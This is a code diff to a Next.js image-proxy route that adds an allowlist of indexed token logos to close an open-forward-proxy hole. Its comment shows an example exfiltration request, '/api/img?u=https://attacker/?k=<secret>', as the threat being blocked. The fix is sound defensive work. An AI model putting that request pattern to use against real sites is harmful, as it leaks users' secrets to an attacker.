@@ -1,5 +1,6 @@
 import { NextResponse } from "next/server";
 import { cached, resolveImage } from "@/lib/feed/images";
+import { isKnownLogo } from "@/lib/feed/query";
 
 export const runtime = "nodejs";
 export const dynamic = "force-dynamic";
@@ -12,6 +13,21 @@ export const dynamic = "force-dynamic";
 export async function GET(req: Request) {
   const raw = new URL(req.url).searchParams.get("u") ?? "";
   if (!raw || raw.length > 512) return new NextResponse(null, { status: 400 });
+
+  /*
+   * Only artwork this app has actually indexed.
+   *
+   * Without this the route is an open forward proxy: it fetched whatever URL
+   * it was handed. That is an exfiltration channel that a Content-Security-
+   * Policy cannot close, because the request to reach it is same-origin and
+   * therefore allowed — a script on the page could call
+   * /api/img?u=https://attacker/?k=<secret> and this server would dutifully
+   * make that request on its behalf, carrying the secret in the URL.
+   *
+   * The logo strings come from token contracts and are already stored, so the
+   * set of URLs worth proxying is known and finite. Anything else is refused.
+   */
+  if (!isKnownLogo(raw)) return new NextResponse(null, { status: 403 });
 
   const hit = cached(raw) ?? (await resolveImage(raw));
   // 404 rather than a placeholder: the client falls back to the direct URL and
